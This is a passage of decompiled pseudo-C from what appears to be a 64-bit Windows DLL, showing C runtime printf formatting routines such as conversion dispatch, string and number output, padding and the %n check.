    "  char v7; // al",
    "  int v8; // ecx",
    "  int v9; // ecx",
    "  int v10; // ecx",
    "  int v11; // ecx",
    "  char v12; // dl",
    "  int v14; // ecx",
    "  __int64 v15; // rdx",
    "  char v16; // r8",
    "  bool v17; // r9",
    "  int v18; // esi",
    "  int v19; // r9d",
    "  int v20; // r8d",
    "  __int64 v21; // rcx",
    "  int v22; // r8d",
    "  int *v23; // rdi",
    "  __int64 v24; // r14",
    "  int v25; // ecx",
    "  int v26; // r8d",
    "  int v27; // edx",
    "  _QWORD *v28; // rcx",
    "  int v29; // edx",
    "  unsigned __int16 *v30; // r12",
    "  int v31; // r15d",
    "  __int64 v32; // rax",
    "  int v33; // r9d",
    "  int v34; // ecx",
    "  int i; // r8d",
    "  __int64 v36; // rdx",
    "  int v37; // ecx",
    "  unsigned int v38; // [rsp+30h] [rbp-20h] BYREF",
    "  _BYTE v39[12]; // [rsp+34h] [rbp-1Ch] BYREF",
    "",
    "  v1 = 120;",
    "  v3 = *(char *)(a1 + 57);",
    "  if ( v3 <= 100 )",
    "  {",
    "    if ( v3 != 100 )",
    "    {",
    "      if ( v3 <= 83 )",
    "      {",
    "        if ( v3 != 83 )",
    "        {",
    "          v4 = v3 - 65;",
    "          if ( v4 )",
    "          {",
    "            v5 = v4 - 2;",
    "            if ( v5 )",
    "            {",
    "              v6 = v5 - 2;",
    "              if ( v6 && (unsigned int)(v6 - 1) > 1 )",
    "                return 0;",
    "              goto LABEL_9;",
    "            }",
    "            goto LABEL_14;",
    "          }",
    "LABEL_9:",
    "          v7 = sub_18001998C(a1);",
    "          goto LABEL_38;",
    "        }",
    "        goto LABEL_34;",
    "      }",
    "      if ( v3 != 88 )",
    "      {",
    "        switch ( v3 )",
    "        {",
    "          case 'Z':",
    "            v7 = sub_180019910(a1);",
    "            goto LABEL_38;",
    "          case 'a':",
    "            goto LABEL_9;",
    "          case 'c':",
    "LABEL_14:",
    "            v7 = sub_180019BE0(a1, 0);",
    "            goto LABEL_38;",
    "        }",
    "        return 0;",
    "      }",
    "      goto LABEL_36;",
    "    }",
    "    goto LABEL_24;",
    "  }",
    "  if ( v3 > 111 )",
    "  {",
    "    if ( v3 == 112 )",
    "    {",
    "      *(_DWORD *)(a1 + 48) = 16;",
    "      *(_DWORD *)(a1 + 52) = 11;",
    "LABEL_36:",
    "      v12 = 1;",
    "LABEL_37:",
    "      v7 = sub_180017ED4(a1, v12);",
    "      goto LABEL_38;",
    "    }",
    "    if ( v3 == 115 )",
    "    {",
    "LABEL_34:",
    "      v7 = sub_180019D6C(a1);",
    "      goto LABEL_38;",
    "    }",
    "    if ( v3 != 117 )",
    "    {",
    "      if ( v3 != 120 )",
    "        return 0;",
    "      v12 = 0;",
    "      goto LABEL_37;",
    "    }",
    "LABEL_25:",
    "    v7 = sub_180017CD0(a1, 0);",
    "    goto LABEL_38;",
    "  }",
    "  if ( v3 != 111 )",
    "  {",
    "    v8 = v3 - 101;",
    "    if ( !v8 )",
    "      goto LABEL_9;",
    "    v9 = v8 - 1;",
    "    if ( !v9 )",
    "      goto LABEL_9;",
    "    v10 = v9 - 1;",
    "    if ( !v10 )",
    "      goto LABEL_9;",
    "    v11 = v10 - 2;",
    "    if ( v11 )",
    "    {",
    "      if ( v11 == 5 )",
    "      {",
    "        v7 = sub_180019CB4(a1);",
    "        goto LABEL_38;",
    "      }",
    "      return 0;",
    "    }",
    "LABEL_24:",
    "    *(_DWORD *)(a1 + 40) |= 0x10u;",
    "    goto LABEL_25;",
    "  }",
    "  if ( (*(_DWORD *)(a1 + 40) & 0x20) != 0 )",
    "    *(_DWORD *)(a1 + 40) |= 0x80u;",
    "  v7 = sub_180017ACC(a1, 0);",
    "LABEL_38:",
    "  if ( !v7 )",
    "    return 0;",
    "  if ( !*(_BYTE *)(a1 + 56) )",
    "  {",
    "    v14 = *(_DWORD *)(a1 + 40);",
    "    LOWORD(v38) = 0;",
    "    v15 = 0;",
    "    BYTE2(v38) = 0;",
    "    if ( (v14 & 0x10) == 0 )",
    "      goto LABEL_49;",
    "    if ( (v14 & 0x40) != 0 )",
    "    {",
    "      LOBYTE(v38) = 45;",
    "    }",
    "    else if ( (v14 & 1) != 0 )",
    "    {",
    "      LOBYTE(v38) = 43;",
    "    }",
    "    else",
    "    {",
    "      if ( (v14 & 2) == 0 )",
    "        goto LABEL_49;",
    "      LOBYTE(v38) = 32;",
    "    }",
    "    v15 = 1;",
    "LABEL_49:",
    "    v16 = *(_BYTE *)(a1 + 57);",
    "    v17 = ((v16 - 88) & 0xDF) == 0 && (v14 & 0x20) != 0;",
    "    if ( v17 || ((v16 - 65) & 0xDF) == 0 )",
    "    {",
    "      v39[v15 - 4] = 48;",
    "      if ( v16 == 88 || v16 == 65 )",
    "        v1 = 88;",
    "      v39[v15 - 3] = v1;",
    "      LODWORD(v15) = v15 + 2;",
    "    }",
    "    v18 = *(_DWORD *)(a1 + 44) - v15 - *(_DWORD *)(a1 + 72);",
    "    if ( (v14 & 0xC) == 0 )",
    "    {",
    "      v19 = 0;",
    "      if ( v18 > 0 )",
    "      {",
    "        v20 = *(_DWORD *)(a1 + 32);",
    "        do",
    "        {",
    "          v21 = *(_QWORD *)(a1 + 1120);",
    "          if ( *(_QWORD *)(v21 + 16) == *(_QWORD *)(v21 + 8) )",
    "          {",
    "            if ( *(_BYTE *)(v21 + 24) )",
    "              v22 = v20 + 1;",
    "            else",
    "              v22 = -1;",
    "            *(_DWORD *)(a1 + 32) = v22;",
    "          }",
    "          else",
    "          {",
    "            *(_DWORD *)(a1 + 32) = v20 + 1;",
    "            ++*(_QWORD *)(v21 + 16);",
    "            *(_BYTE *)(**(_QWORD **)(a1 + 1120))++ = 32;",
    "          }",
    "          v20 = *(_DWORD *)(a1 + 32);",
    "          if ( v20 == -1 )",
    "            break;",
    "          ++v19;",
    "        }",
    "        while ( v19 < v18 );",
    "      }",
    "    }",
    "    v23 = (int *)(a1 + 32);",
    "    v24 = a1 + 1120;",
    "    sub_180019F24(a1 + 1120, &v38, (unsigned int)v15, a1 + 32, *(_QWORD *)(a1 + 8));",
    "    v25 = *(_DWORD *)(a1 + 40);",
    "    if ( (v25 & 8) != 0 && (v25 & 4) == 0 )",
    "    {",
    "      v26 = 0;",
    "      if ( v18 > 0 )",
    "      {",
    "        v27 = *v23;",
    "        do",
    "        {",
    "          v28 = *(_QWORD **)v24;",
    "          if ( *(_QWORD *)(*(_QWORD *)v24 + 16LL) == *(_QWORD *)(*(_QWORD *)v24 + 8LL) )",
    "          {",
    "            if ( *((_BYTE *)v28 + 24) )",
    "              v29 = v27 + 1;",
    "            else",
    "              v29 = -1;",
    "            *v23 = v29;",
    "          }",
    "          else",
    "          {",
    "            *v23 = v27 + 1;",
    "            ++v28[2];",
    "            *(_BYTE *)(**(_QWORD **)v24)++ = 48;",
    "          }",
    "          v27 = *v23;",
    "          if ( *v23 == -1 )",
    "            break;",
    "          ++v26;",
    "        }",
    "        while ( v26 < v18 );",
    "      }",
    "    }",
    "    if ( *(_BYTE *)(a1 + 76) && *(int *)(a1 + 72) > 0 )",
    "    {",
    "      v30 = *(unsigned __int16 **)(a1 + 64);",
    "      v31 = 0;",
    "      while ( 1 )",
    "      {",
    "        v32 = *(_QWORD *)(a1 + 8);",
    "        v33 = *v30;",
    "        v38 = 0;",
    "        ++v30;",
    "        if ( (unsigned int)sub_180025A84((unsigned int)&v38, (unsigned int)v39, 6, v33, v32) || !v38 )",
    "          break;",
    "        sub_180019F24(a1 + 1120, v39, v38, a1 + 32, *(_QWORD *)(a1 + 8));",
    "        if ( ++v31 == *(_DWORD *)(a1 + 72) )",
    "          goto LABEL_91;",
    "      }",
    "      *v23 = -1;",
    "    }",
    "    else",
    "    {",
    "      sub_180019F24(a1 + 1120, *(_QWORD *)(a1 + 64), *(unsigned int *)(a1 + 72), a1 + 32, *(_QWORD *)(a1 + 8));",
    "    }",
    "LABEL_91:",
    "    v34 = *v23;",
    "    if ( *v23 >= 0 && (*(_DWORD *)(a1 + 40) & 4) != 0 )",
    "    {",
    "      for ( i = 0; i < v18; ++i )",
    "      {",
    "        v36 = *(_QWORD *)v24;",
    "        if ( *(_QWORD *)(*(_QWORD *)v24 + 16LL) == *(_QWORD *)(*(_QWORD *)v24 + 8LL) )",
    "        {",
    "          if ( *(_BYTE *)(v36 + 24) )",
    "            v37 = v34 + 1;",
    "          else",
    "            v37 = -1;",
    "          *v23 = v37;",
    "        }",
    "        else",
    "        {",
    "          *v23 = v34 + 1;",
    "          ++*(_QWORD *)(v36 + 16);",
    "          *(_BYTE *)(**(_QWORD **)v24)++ = 32;",
    "        }",
    "        v34 = *v23;",
    "        if ( *v23 == -1 )",
    "          break;",
    "      }",
    "    }",
    "  }",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180019910(__int64 a1)",
    "{",
    "  unsigned __int16 **v1; // rdx",
    "  unsigned __int16 *v2; // r9",
    "  __int64 v3; // r10",
    "  bool v4; // al",
    "  bool v5; // zf",
    "  unsigned int v6; // eax",
    "",
    "  v1 = *(unsigned __int16 ***)(a1 + 24);",
    "  *(_QWORD *)(a1 + 24) = v1 + 1;",
    "  v2 = *v1;",
    "  if ( !*v1 || (v3 = *((_QWORD *)v2 + 1)) == 0 )",
    "  {",
    "    v6 = 6;",
    "    *(_QWORD *)(a1 + 64) = \"(null)\";",
    "    goto LABEL_13;",
    "  }",
    "  if ( *(_DWORD *)(a1 + 52) != 2 )",
    "  {",
    "    if ( *(_DWORD *)(a1 + 52) == 3 || *(_DWORD *)(a1 + 52) == 12 )",
    "    {",
    "      v4 = 1;",
    "      goto LABEL_10;",
    "    }",
    "    if ( *(_DWORD *)(a1 + 52) != 13 )",
    "    {",
    "      v4 = ((*(_BYTE *)(a1 + 57) - 99) & 0xEF) != 0;",
    "      goto LABEL_10;",
    "    }",
    "  }",
    "  v4 = 0;",
    "LABEL_10:",
    "  *(_QWORD *)(a1 + 64) = v3;",
    "  v5 = !v4;",
    "  v6 = *v2;",
    "  if ( v5 )",
    "  {",
    "LABEL_13:",
    "    *(_BYTE *)(a1 + 76) = 0;",
    "    goto LABEL_14;",
    "  }",
    "  *(_BYTE *)(a1 + 76) = 1;",
    "  v6 >>= 1;",
    "LABEL_14:",
    "  *(_DWORD *)(a1 + 72) = v6;",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_18001998C(__int64 a1)",
    "{",
    "  int v2; // eax",
    "  __int64 v3; // rdi",
    "  char v4; // al",
    "  int v5; // r8d",
    "  __int64 v6; // rax",
    "  int v7; // edx",
    "  __int64 v8; // rax",
    "  __int64 *v9; // rcx",
    "  __int64 v10; // r10",
    "  __int64 v11; // r11",
    "  __int64 v12; // rsi",
    "  int v13; // ebp",
    "  __int64 v14; // r9",
    "  __int64 v15; // rcx",
    "  unsigned __int64 v16; // r9",
    "  __int64 v17; // r8",
    "  unsigned __int64 v18; // rax",
    "  __int64 v19; // rdi",
    "  unsigned __int8 *v20; // rcx",
    "  _QWORD *v21; // r9",
    "  __int64 v22; // rdx",
    "  bool v23; // zf",
    "  _BYTE *v24; // rdx",
    "  char *v25; // rdx",
    "  char v26; // al",
    "  char v27; // cl",
    "  __int64 v28; // rdi",
    "  char *v29; // rcx",
    "  char v30; // al",
    "  __int64 v31; // rdx",
    "  __int64 v32; // rdx",
    "  char result; // al",
    "  __int64 v34; // [rsp+60h] [rbp+8h] BYREF",
    "",
    "  *(_DWORD *)(a1 + 40) |= 0x10u;",
    "  v2 = *(_DWORD *)(a1 + 48);",
    "  if ( v2 >= 0 )",
    "  {",
    "    if ( !v2 && (*(_BYTE *)(a1 + 57) == 103 || *(_BYTE *)(a1 + 57) == 71) )",
    "    {",
    "      *(_DWORD *)(a1 + 48) = 1;",
    "      v2 = 1;",
    "    }",
    "  }",
    "  else",
    "  {",
    "    v2 = ((*(_BYTE *)(a1 + 57) - 65) & 0xDF) != 0 ? 6 : 13;",
    "    *(_DWORD *)(a1 + 48) = v2;",
    "  }",
    "  v3 = a1 + 80;",
    "  v4 = sub_180017770(a1 + 80, v2 + 349, *(_QWORD *)(a1 + 8));",
    "  v5 = 512;",
    "  if ( v4 )",
    "  {",
    "    v7 = *(_DWORD *)(a1 + 48);",
    "  }",
    "  else",
    "  {",
    "    if ( *(_QWORD *)(a1 + 1112) )",
    "      v6 = *(_QWORD *)(a1 + 1104) >> 1;",
    "    else",
    "      LODWORD(v6) = 512;",
    "    v7 = v6 - 349;",
    "    *(_DWORD *)(a1 + 48) = v6 - 349;",
    "  }",
    "  v8 = *(_QWORD *)(v3 + 1032);",
    "  if ( !v8 )",
    "    v8 = v3;",
    "  *(_QWORD *)(a1 + 64) = v8;",
    "  v9 = *(__int64 **)(a1 + 24);",
    "  v34 = 0;",
    "  *(_QWORD *)(a1 + 24) = v9 + 1;",
    "  v10 = *(_QWORD *)(a1 + 1112);",
    "  v11 = *(_QWORD *)(a1 + 8);",
    "  v12 = *(_QWORD *)a1;",
    "  v13 = *(char *)(a1 + 57);",
    "  v34 = *v9;",
    "  if ( v10 )",
    "  {",
    "    v16 = *(_QWORD *)(v3 + 1024);",
    "    LODWORD(v3) = v10;",
    "    v14 = v10 + (v16 >> 1);",
    "    v15 = *(_QWORD *)(a1 + 1104) >> 1;",
    "    v5 = v15;",
    "  }",
    "  else",
    "  {",
    "    LODWORD(v14) = v3 + 512;",
    "    v15 = 512;",
    "  }",
    "  sub_18002579C((unsigned int)&v34, v3, v5, v14, v15, v13, v7, v12, 1, v11);",
    "  v18 = *(_DWORD *)(a1 + 40) >> 5;",
    "  if ( (*(_DWORD *)(a1 + 40) & 0x20) != 0 && !*(_DWORD *)(a1 + 48) )",
    "  {",
    "    v19 = *(_QWORD *)(a1 + 8);",
    "    if ( !*(_BYTE *)(v19 + 40) )",
    "      sub_180019E10(*(_QWORD *)(a1 + 8));",
    "    v20 = *(unsigned __int8 **)(a1 + 64);",
    "    v21 = *(_QWORD **)(v19 + 24);",
    "    v17 = *v20;",
    "    v22 = v21[34];",
    "    if ( *(_BYTE *)(v17 + v22) != 101 )",
    "    {",
    "      do",
    "        v17 = *++v20;",
    "      while ( (*(_BYTE *)(*v21 + 2 * v17) & 4) != 0 );",
    "    }",
    "    v23 = *(_BYTE *)((unsigned __int8)v17 + v22) == 120;",
    "    if ( *(_BYTE *)((unsigned __int8)v17 + v22) == 120 )",
    "      LOBYTE(v17) = v20[2];",
    "    v18 = v21[31];",
    "    v24 = v20 + 2;",
    "    if ( !v23 )",
    "      v24 = v20;",
    "    *v24 = **(_BYTE **)v18;",
    "    v25 = v24 + 1;",
    "    do",
    "    {",
    "      v26 = *v25;",
    "      v27 = v17;",
    "      *v25++ = v17;",
    "      LOBYTE(v17) = v26;",
    "    }",
    "    while ( v27 );",
    "  }",
    "  if ( ((*(_BYTE *)(a1 + 57) - 71) & 0xDF) == 0 )",
    "  {",
    "    v18 = *(_DWORD *)(a1 + 40) >> 5;",
    "    if ( (*(_DWORD *)(a1 + 40) & 0x20) == 0 )",
    "    {",
    "      v28 = *(_QWORD *)(a1 + 8);",
    "      if ( !*(_BYTE *)(v28 + 40) )",
    "        sub_180019E10(*(_QWORD *)(a1 + 8));",
    "      v18 = sub_180018538(*(_QWORD *)(a1 + 64), v28 + 24, v17);",
    "    }",
    "  }",
    "  v29 = *(char **)(a1 + 64);",
    "  v30 = *v29;",
    "  if ( *v29 == 45 )",
    "  {",
    "    *(_DWORD *)(a1 + 40) |= 0x40u;",
    "    *(_QWORD *)(a1 + 64) = ++v29;",
    "    v30 = *v29;",
    "  }",
    "  LOBYTE(v18) = v30 - 73;",
    "  if ( (unsigned __int8)v18 <= 0x25u )",
    "  {",
    "    v31 = 0x2100000021LL;",
    "    if ( _bittest64(&v31, v18) )",
    "    {",
    "      *(_DWORD *)(a1 + 40) &= ~8u;",
    "      *(_BYTE *)(a1 + 57) = 115;",
    "    }",
    "  }",
    "  v32 = -1;",
    "  do",
    "    ++v32;",
    "  while ( v29[v32] );",
    "  result = 1;",
    "  *(_DWORD *)(a1 + 72) = v32;",
    "  return result;",
    "}",
    "",
    "",
    "char __fastcall sub_180019BE0(__int64 a1)",
    "{",
    "  char v1; // dl",
    "  int v3; // ecx",
    "  int v4; // ecx",
    "  unsigned __int16 *v5; // rcx",
    "  __int64 v6; // rdx",
    "  __int64 v7; // r8",
    "  __int64 v8; // rdi",
    "  _BYTE *v9; // rcx",
    "  _BYTE *v10; // rdx",
    "  __int64 v11; // rcx",
    "  char result; // al",
    "",
    "  v1 = *(_BYTE *)(a1 + 57);",
    "  v3 = *(_DWORD *)(a1 + 52) - 2;",
    "  if ( v3 && ((v4 = v3 - 1) == 0 || v4 == 9 || *(_DWORD *)(a1 + 52) != 13 && ((v1 - 99) & 0xEF) != 0) )",
    "  {",
    "    v5 = *(unsigned __int16 **)(a1 + 24);",
    "    *(_QWORD *)(a1 + 24) = v5 + 4;",
    "    v6 = *(_QWORD *)(a1 + 1112);",
    "    if ( v6 )",
    "    {",
    "      v8 = a1 + 80;",
    "      v7 = *(_QWORD *)(a1 + 1104) >> 1;",
    "    }",
    "    else",
    "    {",
    "      LODWORD(v6) = a1 + 80;",
    "      LODWORD(v7) = 512;",
    "      v8 = a1 + 80;",
    "    }",
    "    if ( (unsigned int)sub_180025A84((int)a1 + 72, v6, v7, *v5, *(_QWORD *)(a1 + 8)) )",
    "      *(_BYTE *)(a1 + 56) = 1;",
    "  }",
    "  else",
    "  {",
    "    v9 = *(_BYTE **)(a1 + 24);",
    "    v8 = a1 + 80;",
    "    v10 = *(_BYTE **)(a1 + 1112);",
    "    if ( !v10 )",
    "      v10 = (_BYTE *)(a1 + 80);",
    "    *(_QWORD *)(a1 + 24) = v9 + 8;",
    "    *v10 = *v9;",
    "    *(_DWORD *)(a1 + 72) = 1;",
    "  }",
    "  v11 = *(_QWORD *)(v8 + 1032);",
    "  result = 1;",
    "  if ( !v11 )",
    "    v11 = v8;",
    "  *(_QWORD *)(a1 + 64) = v11;",
    "  return result;",
    "}",
    "",
    "",
    "char __fastcall sub_180019CB4(__int64 a1)",
    "{",
    "  _QWORD **v1; // rdx",
    "  _QWORD *v3; // rdi",
    "  __int64 v4; // rax",
    "  int v6; // ecx",
    "  int v7; // ecx",
    "  int v8; // ecx",
    "  int v9; // ecx",
    "  int v10; // ecx",
    "  int v11; // ecx",
    "",
    "  v1 = *(_QWORD ***)(a1 + 24);",
    "  *(_QWORD *)(a1 + 24) = v1 + 1;",
    "  v3 = *v1;",
    "  if ( !get_printf_count_output() )",
    "    goto LABEL_2;",
    "  v6 = *(_DWORD *)(a1 + 52);",
    "  if ( v6 > 5 )",
    "  {",
    "    v9 = v6 - 6;",
    "    if ( v9 )",
    "    {",
    "      v10 = v9 - 1;",
    "      if ( v10 )",
    "      {",
    "        v8 = v10 - 2;",
    "        if ( v8 )",
    "          goto LABEL_13;",
    "      }",
    "    }",
    "LABEL_15:",
    "    *v3 = *(int *)(a1 + 32);",
    "    goto LABEL_16;",
    "  }",
    "  if ( v6 == 5 )",
    "    goto LABEL_15;",
    "  if ( !v6 )",
    "    goto LABEL_17;",
    "  v7 = v6 - 1;",
    "  if ( !v7 )",
    "  {",
    "    *(_BYTE *)v3 = *(_BYTE *)(a1 + 32);",
    "    goto LABEL_16;",
    "  }",
    "  v8 = v7 - 1;",
    "  if ( v8 )",
    "  {",
    "LABEL_13:",
    "    v11 = v8 - 1;",
    "    if ( v11 )",
    "    {",
    "      if ( v11 != 1 )",
    "      {",
    "LABEL_2:",
    "        v4 = *(_QWORD *)(a1 + 8);",
    "        *(_BYTE *)(v4 + 48) = 1;",
    "        *(_DWORD *)(v4 + 44) = 22;",
    "        sub_18001A598(0, 0, 0, 0, 0, *(_QWORD *)(a1 + 8));",
    "        return 0;",
    "      }",
    "      goto LABEL_15;",
    "    }",
    "LABEL_17:",
    "    *(_DWORD *)v3 = *(_DWORD *)(a1 + 32);",
    "    goto LABEL_16;",
    "  }",
    "  *(_WORD *)v3 = *(_WORD *)(a1 + 32);",
    "LABEL_16:",
    "  *(_BYTE *)(a1 + 56) = 1;",
    "  return 1;",
    "}",
    "",
    "",
    "char __fastcall sub_180019D6C(__int64 a1)",
    "{",
    "  const char **v1; // rdx",
    "  const char *v3; // rcx",
    "  int v4; // r8d",
    "  int v5; // edx",
    "  char v6; // r9",
    "  int v7; // edx",
    "  int v8; // edx",
    "  int v9; // eax",
    "",
    "  v1 = *(const char ***)(a1 + 24);",
    "  *(_QWORD *)(a1 + 24) = v1 + 1;",
    "  v3 = *v1;",
    "  v4 = *(_DWORD *)(a1 + 48);",
    "  v5 = *(_DWORD *)(a1 + 52);",
    "  v6 = *(_BYTE *)(a1 + 57);",
    "  if ( v4 == -1 )",
    "    v4 = 0x7FFFFFFF;",
    "  *(_QWORD *)(a1 + 64) = v3;",
    "  v7 = v5 - 2;",
    "  if ( v7 && ((v8 = v7 - 1) == 0 || v8 == 9 || *(_DWORD *)(a1 + 52) != 13 && ((v6 - 99) & 0xEF) != 0) )",
    "  {",
    "    if ( !v3 )",
    "    {",
    "      v3 = (const char *)L\"(null)\";",
    "      *(_QWORD *)(a1 + 64) = L\"(null)\";",
    "    }",
    "    *(_BYTE *)(a1 + 76) = 1;",
    "    v9 = sub_180021E08(v3, v4);",
    "  }",
    "  else",
    "  {",
    "    if ( !v3 )",
    "    {",
    "      v3 = \"(null)\";",
    "      *(_QWORD *)(a1 + 64) = \"(null)\";",
    "    }",
    "    v9 = sub_180021CB8(v3, v4);",
    "  }",
    "  *(_DWORD *)(a1 + 72) = v9;",
    "  return 1;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_180019E10(__int64 a1)",
    "{",
    "  __int64 v2; // rsi",
    "  __int64 result; // rax",
    "",
    "  v2 = sub_1800185B0(a1);",
    "  *(_QWORD *)(a1 + 24) = *(_QWORD *)(v2 + 144);",
    "  *(_QWORD *)(a1 + 32) = *(_QWORD *)(v2 + 136);",
    "  sub_180024BE4(v2, a1 + 24, *(_QWORD *)(a1 + 8));",
    "  sub_180024C50(v2, a1 + 32, *(_QWORD *)(a1 + 8));",
    "  result = *(unsigned int *)(v2 + 936);",
    "  if ( (result & 2) == 0 )",
    "  {",
    "    result = (unsigned int)result | 2;",
    "    *(_DWORD *)(v2 + 936) = result;",
    "    *(_BYTE *)(a1 + 40) = 2;",
    "  }",
    "  return result;",
    "}",
    "",
    "",
    "char __fastcall sub_180019E88(__int64 a1)",
    "{",
    "  int v1; // eax",
    "  __int64 v2; // rcx",
    "  _BYTE *v3; // r10",
    "  _BYTE *v4; // rdx",
    "",
    "  if ( (*(_DWORD *)(a1 + 20) & 0x1000) != 0 )",
    "    return 1;",
    "  v1 = sub_180025DAC();",
    "  v3 = &unk_18004B2E0;",
    "  if ( (unsigned int)(v1 + 2) <= 1 )",
    "  {",
    "    v4 = &unk_18004B2E0;",
    "  }",
    "  else",
    "  {",
    "    v2 = 9LL * (v1 & 0x3F);",
    "    v4 = (_BYTE *)(qword_18004D870[(__int64)v1 >> 6] + 72LL * (v1 & 0x3F));",
    "  }",
    "  if ( !v4[57] )",
    "  {",
    "    if ( (unsigned int)(v1 + 2) > 1 )",
    "    {",
    "      v2 = 9LL * (v1 & 0x3F);",
    "      v3 = (_BYTE *)(qword_18004D870[(__int64)v1 >> 6] + 72LL * (v1 & 0x3F));",
    "    }",
    "    if ( (v3[61] & 1) == 0 )",
    "      return 1;",
    "  }",
    "  *(_DWORD *)sub_18001A80C(v2, v4) = 22;",
    "  invalid_parameter_noinfo();",
    "  return 0;",
    "}",
    "",
    "",
    "void __fastcall sub_180019F24(__int64 a1, __int64 a2, int a3, _DWORD *a4)",
    "{",
    "  __int64 v5; // rdi",
    "  _QWORD *v6; // rcx",
    "  __int64 v8; // rax",
    "  unsigned __int64 v9; // rax",
    "  unsigned __int64 v10; // rsi",
    "  __int64 v11; // rcx",
    "",
    "  if ( a3 )",
    "  {",
    "    v5 = a3;",
    "    v6 = *(_QWORD **)a1;",
    "    v8 = v6[1];",
    "    if ( v6[2] == v8 )",
    "    {",
    "      if ( *((_BYTE *)v6 + 24) )",
    "        *a4 += a3;",
    "      else",
    "        *a4 = -1;",
    "    }",
    "    else",
    "    {",
    "      v9 = v8 - v6[2];",
    "      v10 = a3;",
    "      v11 = *v6;",
    "      if ( v9 < a3 )",
    "        v10 = v9;",
    "      sub_180036160(v11, a2, v10);",
    "      **(_QWORD **)a1 += v10;",
    "      *(_QWORD *)(*(_QWORD *)a1 + 16LL) += v10;",
    "      if ( *(_BYTE *)(*(_QWORD *)a1 + 24LL) )",
    "      {",
    "        *a4 += v5;",
    "      }",
    "      else if ( v10 == v5 )",
    "      {",
    "        *a4 += v10;",
    "      }",
    "      else",
    "      {",
    "        *a4 = -1;",
    "      }",
    "    }",
    "  }",
    "}",
    "",
    "",
    "void __fastcall sub_180019FC8(_QWORD *a1, char *a2, int a3, _DWORD *a4, __int64 a5)",
    "{",
    "  char *v6; // r14",
    "  char *v7; // rbp",
    "  bool v9; // zf",
    "  __int64 v10; // rbx",
    "",
    "  v6 = a2;",
    "  v7 = &a2[a3];",
    "  v9 = a2 == v7;",
    "  v10 = *(_QWORD *)(a5 + 44);",
    "  while ( !v9 )",
    "  {",
    "    if ( (*(_DWORD *)(*a1 + 20LL) & 0x1000) != 0 && !*(_QWORD *)(*a1 + 8LL)",
    "      || (unsigned int)sub_18001E42C((unsigned int)*v6, *a1, a5) != -1 )",
    "    {",
    "      goto LABEL_11;",
    "    }",
    "    if ( !*(_BYTE *)(a5 + 48) || *(_DWORD *)(a5 + 44) != 42 )",
    "    {",
    "      *a4 = -1;",
    "      break;",
    "    }",
    "    if ( ((*(_DWORD *)(*a1 + 20LL) & 0x1000) == 0 || *(_QWORD *)(*a1 + 8LL))",
    "      && (unsigned int)sub_18001E42C(63, *a1, a5) == -1 )",
    "    {",
    "      *a4 = -1;",
    "    }",
    "    else",
    "    {",
    "LABEL_11:",
    "      ++*a4;",
    "    }",
    "    v9 = ++v6 == v7;",
    "  }",
    "  *(_QWORD *)(a5 + 44) = v10;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001A094(__int64 a1, __int64 a2, __int64 a3, __int128 *a4, __int64 a5)",
    "{",
    "  __int128 v5; // xmm0",
    "  unsigned int v6; // edi",
    "  int v7; // ebx",
    "  int v8; // ebx",
    "  _QWORD v10[2]; // [rsp+30h] [rbp-41h] BYREF",
    "  char v11; // [rsp+40h] [rbp-31h]",
    "  __int128 v12; // [rsp+48h] [rbp-29h]",
    "  char v13; // [rsp+58h] [rbp-19h]",
    "  int v14; // [rsp+5Ch] [rbp-15h]",
    "  char v15; // [rsp+60h] [rbp-11h]",
    "  int v16; // [rsp+64h] [rbp-Dh]",
    "  char v17; // [rsp+68h] [rbp-9h]",
    "  __int64 v18; // [rsp+70h] [rbp-1h] BYREF",
    "  __int64 v19; // [rsp+78h] [rbp+7h] BYREF",
    "  _QWORD v20[8]; // [rsp+80h] [rbp+Fh] BYREF",
    "  __int64 v21; // [rsp+D0h] [rbp+5Fh] BYREF",
    "  __int64 v22; // [rsp+D8h] [rbp+67h] BYREF",
    "  __int64 v23; // [rsp+E0h] [rbp+6Fh] BYREF",
    "  __int64 v24; // [rsp+E8h] [rbp+77h] BYREF",
    "",
    "  v10[0] = 0;",
    "  v11 = 0;",
    "  v13 = 0;",
    "  v15 = 0;",
    "  v17 = 0;",
    "  if ( a4 )",
    "  {",
    "    v5 = *a4;",
    "LABEL_5:",
    "    v13 = 1;",
    "    v12 = v5;",
    "    goto LABEL_6;",
    "  }",
    "  if ( !dword_18004DC98 )",
    "  {",
    "    v5 = *(_OWORD *)&off_18004B498;",
    "    goto LABEL_5;",
    "  }",
    "LABEL_6:",
    "  v24 = a5;",
    "  v23 = a3;",
    "  v21 = a2;",
    "  v22 = a1;",
    "  if ( a2 && a3 )",
    "  {",
    "    v18 = a2;",
    "    v20[0] = &v21;",
    "    v19 = a2;",
    "    v20[1] = v10;",
    "    v20[2] = &v22;",
    "    v20[3] = &v23;",
    "    v20[4] = &v24;",
    "    v6 = sub_180017580((__int64)&a5, &v19, (__int64)v20, &v18);",
    "  }",
    "  else",
    "  {",
    "    v15 = 1;",
    "    v14 = 22;",
    "    sub_18001A598(0, 0, 0, 0, 0, (__int64)v10);",
    "    v6 = -1;",
    "  }",
    "  if ( v13 == 2 )",
    "    *(_DWORD *)(v10[0] + 936LL) &= ~2u;",
    "  if ( v15 )",
    "  {",
    "    v7 = v14;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v10) + 32) = v7;",
    "  }",
    "  if ( v17 )",
    "  {",
    "    v8 = v16;",
    "    *(_DWORD *)(sub_1800185B0((__int64)v10) + 36) = v8;",
    "  }",
    "  return v6;",
    "}",
    "",
    "",
    "__int64 __fastcall sub_18001A1B8(__int64 a1, _BYTE *a2, unsigned __int64 a3, __int64 a4, __int128 *a5, __int64 a6)",
    "{",
    "  __int128 v7; // xmm0",
    "  int v8; // eax",
    "  unsigned int v9; // edi",
    "  int v10; // ebx",
    "  int v11; // ebx",
    "  _QWORD v13[2]; // [rsp+30h] [rbp-40h] BYREF",
    "  char v14; // [rsp+40h] [rbp-30h]",
    "  __int128 v15; // [rsp+48h] [rbp-28h]",
    "  char v16; // [rsp+58h] [rbp-18h]",
    "  int v17; // [rsp+5Ch] [rbp-14h]",
    "  char v18; // [rsp+60h] [rbp-10h]",
    "  int v19; // [rsp+64h] [rbp-Ch]",
    "  char v20; // [rsp+68h] [rbp-8h]",
    "",
    "  v13[0] = 0;",
    "  v14 = 0;",
    "  v16 = 0;",
    "  v18 = 0;",
    "  v20 = 0;",
    "  if ( a5 )",
    "  {",
